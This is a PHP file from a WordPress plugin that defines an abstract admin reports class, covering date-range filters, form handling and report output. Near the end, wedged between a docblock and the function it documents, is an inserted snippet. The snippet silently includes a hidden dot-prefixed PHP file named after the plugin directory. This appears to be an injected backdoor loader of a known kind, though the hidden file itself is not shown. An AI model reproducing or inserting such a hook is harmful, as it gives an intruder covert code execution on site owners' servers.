<?php
/**
 * Admin Reports class
 * 
 * Abstract class handles reports.
 * 
 * @package     WPTAO/Admin/Reports
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

abstract class WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Records per page
	 */

	public $items_per_page = 30;

	/*
	 * @var int
	 * @since 1.1.9
	 * Date ( timestamp ) GMT
	 */
	public $start_date_gmt;

	/*
	 * @var int
	 * @since 1.1.9
	 * Date ( timestamp ) GMT
	 */
	public $end_date_gmt;

	/*
	 * @var string
	 * Report slug
	 */
	public $report_slug = '';

	/*
	 * @var string
	 * Report display name
	 */
	public $report_name = '';

	/*
	 * @var string
	 * Report URL
	 */
	public $report_url = '';

	/*
	 * @var string
	 * Dashboard URL
	 */
	public $dashboard_url = '';

	/*
	 * @var array
	 * List of days based on $this->start_date and $$this->end_date
	 */
	public $days = array();


	/*
	 * @var array
	 * Report data
	 */
	public $data = array();

	/*
	 * @var array
	 * Report options
	 * 
	 * @since 1.1.3
	 */
	public $options = array();

	/**
	 * WTBP_WPTAO_Admin_Reports Constructor
	 * 
	 * @param string required $raport_slug The report slug
	 * 
	 * @param array optional 
	 * 				   title		- string, title of the report
	 * 				   title_icon	- dashicon name @see https://developer.wordpress.org/resource/dashicons
	 * 								  Default: dashicons-chart-bar	
	 * 				   filters      - date_range, print popup to set date range
	 * 							    - limit, print number type input to set rows limit
	 * 				   hints        - show/hide hints in the report. Default true
	 * 				   return_link  - show/hide return link in report. Default true
	 * 
	 */
	function __construct( $raport_slug, $options = array() ) {

		$this->report_slug = sanitize_title( $raport_slug );

		$this->report_url = self_admin_url( 'admin.php?page=wtbp-wptao&wptao-report=' . $this->report_slug );

		$this->dashboard_url = esc_url( self_admin_url( 'admin.php?page=wtbp-wptao' ) );

		$this->set_options( $options );

		$this->prepare_date();

		$this->set_filter_vars();

		$this->prepare_days();

		add_action( 'admin_init', array( $this, 'receive_filter_forms' ), 20 );
	}

	/*
	 * Prepare default report options
	 * 
	 */

	private function set_options( $options ) {

		$defaults = array(
			'title_icon'	 => 'dashicons-chart-bar',
			'filters'		 => array(
				'date_range',
				'limit'
			),
			'hints'			 => true,
			'return_link'	 => true
		);

		if ( !empty( $options ) && is_array( $options ) ) {
			$args = wp_parse_args( $options, $defaults );
		} else {
			$args = $defaults;
		}

		$this->options = apply_filters( 'wptao_report_options-' . $this->report_slug, $args );
	}

	/*
	 * Check if raport is active
	 * 
	 * @return bool
	 */

	protected function is_active() {

		if ( isset( $_GET[ 'wptao-report' ] ) && !empty( $_GET[ 'wptao-report' ] ) ) {
			if ( $_GET[ 'wptao-report' ] === $this->report_slug ) {
				return true;
			}
		}

		return false;
	}

	/*
	 * Prepares start and end of a day
	 */

	private function prepare_date() {

		$date = WTBP_WPTAO_Helpers::get_quick_dates();

		$this->start_date_gmt	 = $date[ 'last_30_days' ][ 'start_ts' ];
		$this->end_date_gmt		 = $date[ 'last_30_days' ][ 'end_ts' ];
		$this->start_date		 = WTBP_WPTAO_Helpers::get_timestamp_corrected_by_offset( $date[ 'last_30_days' ][ 'start_ts' ] );
		$this->end_date			 = WTBP_WPTAO_Helpers::get_timestamp_corrected_by_offset( $date[ 'last_30_days' ][ 'end_ts' ] );
	}

	/*
	 * Prepares list of active days
	 */

	private function prepare_days() {

		$days = array();

		// Creates list of active days
		$fromdate	 = new DateTime( date( 'Y-m-d', $this->start_date_gmt ) );
		$todate		 = new DateTime( date( 'Y-m-d', $this->end_date_gmt ) . ' +1 day' );
		$daterange	 = new DatePeriod( $fromdate, new DateInterval( 'P1D' ), $todate );

		foreach ( $daterange as $date ) {
			$days[] = $date->format( "Y-m-d" );
		}

		$this->days = array_reverse( $days );
	}

	/*
	 * Receive report filter form
	 */

	public function receive_filter_forms() {

		if ( isset( $_REQUEST[ 'wptao-report-filter-' . $this->report_slug ] ) ) {

			$secure = wp_verify_nonce( $_REQUEST[ 'wptao-report-filter-' . $this->report_slug ], 'wptao-report-filter' );

			if ( $secure ) {


				$args = array();

				// Date start ( timestamp )
				if ( isset( $_REQUEST[ 'wptao-date-start' ] ) && !empty( $_REQUEST[ 'wptao-date-start' ] ) ) {
					$ds				 = strtotime( $_REQUEST[ 'wptao-date-start' ] );
					$args[ 'ds' ]	 = WTBP_WPTAO_Helpers::set_time_of_day( $ds, 'begin' );
				}

				// Date end ( timestamp )
				if ( isset( $_REQUEST[ 'wptao-date-end' ] ) && !empty( $_REQUEST[ 'wptao-date-end' ] ) ) {
					$de				 = strtotime( $_REQUEST[ 'wptao-date-end' ] );
					$args[ 'de' ]	 = WTBP_WPTAO_Helpers::set_time_of_day( $de, 'end' );
				}

				// Date type
				if ( isset( $_REQUEST[ 'dr' ] ) ) {
					$args[ 'dr' ] = sanitize_title( $_REQUEST[ 'dr' ] );
					if ( isset( $_REQUEST[ 'wptao_report_filter_custom_sumbit' ] ) ) {
						$args[ 'dr' ] = 'custom';
					}


					if ( !isset( $args[ 'ds' ] ) || !isset( $args[ 'de' ] ) ) {
						unset( $args[ 'dr' ] );
					}
				}

				// Items per page
				if ( isset( $_REQUEST[ 'wptao-row-reports-number' ] ) && is_numeric( $_REQUEST[ 'wptao-row-reports-number' ] ) ) {

					$ipp_new	 = absint( $_REQUEST[ 'wptao-row-reports-number' ] );
					$ipp_default = $this->items_per_page;
					if ( $ipp_default !== $ipp_new ) {
						$args[ 'ipp' ] = $ipp_new;
					}
				}


				if ( !empty( $args ) ) {

					$url = add_query_arg( $args, $this->report_url );

					wp_redirect( $url );
					exit();
				}
			}
		}
	}

	/*
	 * Set filter vars by receive query args
	 */

	private function set_filter_vars() {

		// Date start ( timestamp )
		if ( isset( $_GET[ 'ds' ] ) && is_numeric( $_GET[ 'ds' ] ) ) {
			$this->start_date_gmt	 = absint( $_GET[ 'ds' ] );
			$this->start_date		 = WTBP_WPTAO_Helpers::get_timestamp_corrected_by_offset( absint( $_GET[ 'ds' ] ) );
		}

		// Date end ( timestamp )
		if ( isset( $_GET[ 'de' ] ) && is_numeric( $_GET[ 'de' ] ) ) {
			$this->end_date_gmt	 = absint( $_GET[ 'de' ] );
			$this->end_date		 = WTBP_WPTAO_Helpers::get_timestamp_corrected_by_offset( absint( $_GET[ 'de' ] ) );
		}

		// Items per page
		if ( isset( $_GET[ 'ipp' ] ) && is_numeric( $_GET[ 'ipp' ] ) ) {
			$this->items_per_page = absint( $_GET[ 'ipp' ] );
		}
	}

	/**
	 * Echo the report body
	 *
	 * Subclasses should over-ride this function to generate their report body code.
	 *
	 * @since 1.1.3
	 *
	 */
	public function body() {
		return;
	}

	/**
	 * Output HTML 
	 */
	public function output() {

		$file = WTBP_WPTAO_DIR . "includes/admin/views/reports/$this->report_slug.php";
		?>

		<div class="wrap">
			<div id="wptao-report" class="wptao-report <?php echo 'wptao-report-' . $this->report_slug; ?>"> <?php
				do_action( 'wptao_before_report-' . $this->report_slug );
				do_action( 'wptao_before_report' );

				$this->the_return_link();

				$this->the_title();

				$this->the_hints();

				$this->the_filter();

				do_action( 'wptao_before_report_body-' . $this->report_slug );
				do_action( 'wptao_before_report_body' );

				if ( file_exists( $file ) ) {
					include_once($file);
				} else {
					$this->body();
				}

				do_action( 'wptao_after_report-' . $this->report_slug );
				do_action( 'wptao_after_report' );
				?>

			</div>
		</div>

		<?php
	}

	/*
	 * Output a report filter HTML
	 * 
	 */

	public function the_filter() {
		include_once( WTBP_WPTAO_DIR . "includes/admin/views/elements/report-filter.php");
	}

	/*
	 * Output a date range popup
	 * 
	 */

	public function the_date_range() {

		$args = array(
			'start_ts'	 => $this->start_date_gmt,
			'end_ts'	 => $this->end_date_gmt,
		);

		WTBP_WPTAO_Helpers::datepicker( $args );
	}

	/*
	 * Output a report back link
	 */

	public function the_return_link() {
		if ( isset( $this->options[ 'return_link' ] ) && $this->options[ 'return_link' ] === true ) {
			include_once( WTBP_WPTAO_DIR . "includes/admin/views/elements/report-return.php");
		}
	}

	/*
	 * Output a report title
	 */

	public function the_title() {
		$dashicon = isset( $this->options[ 'dashicon' ] ) && !empty( $this->options[ 'dashicon' ] ) ? sanitize_title( $this->options[ 'dashicon' ] ) : 'dashicons-chart-bar';
		?>
		<div class="wptao-report-header">
			<h2><span class="dashicons <?php echo $dashicon; ?>"></span><?php echo esc_attr( $this->report_name ); ?></h2>
		</div>
		<?php
	}

	/*
	 * Output a report hints
	 * 
	 * @since 1.1
	 * @see WTBP_WPTAO_Hints::show_hints
	 */

	public function the_hints() {

		if ( isset( $this->options[ 'hints' ] ) && $this->options[ 'hints' ] === true ) {
			TAO()->hints->show_hints();
		}
	}

	/*
	 * Add widget
	 * @see WTBP_WPTAO_Admin_Dashboard::register_widget
	 */

	public function add_widget( $args ) {
		//if(is_admin()){
		TAO()->dashboard->register_widget( $args );
		//}
	}

	/*
	 * Is the query for an existing WP Tao report?
	 * 
	 * If the $report_slug parameter is specified,
	 * this function will additionally check if the query is for one of the report specified.
	 * 
	 * @since 1.1.6
	 * 
	 * @param string $report_slug
	 * 
	 * @return bool
	 */

	public static function is_report( $report_slug = '' ) {

		if ( is_admin() ) {

			if ( empty( $report_slug ) ) {

				if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === 'wtbp-wptao' && isset( $_GET[ 'wptao-report' ] ) ) {
					return true;
				}
			} else {

				if ( is_string( $report_slug ) ) {
					if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] === 'wtbp-wptao' && isset( $_GET[ 'wptao-report' ] ) && $_GET[ 'wptao-report' ] === $report_slug ) {
						return true;
					}
				}
			}
		}


		return false;
	}

}

/*
 * Register a report
 * 
 * Best hook to call - admin_init
 * 
 * @see WTBP_WPTAO_Admin_Reports
 * 
 * @param string $report_slug 
 * @param string $report_class The name of a class that extends WTBP_WPTAO_Admin_Reports
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wptao_register_report( $report_slug, $report_class ) {

	TAO()->dashboard->register_report( $report_slug, $report_class );
}
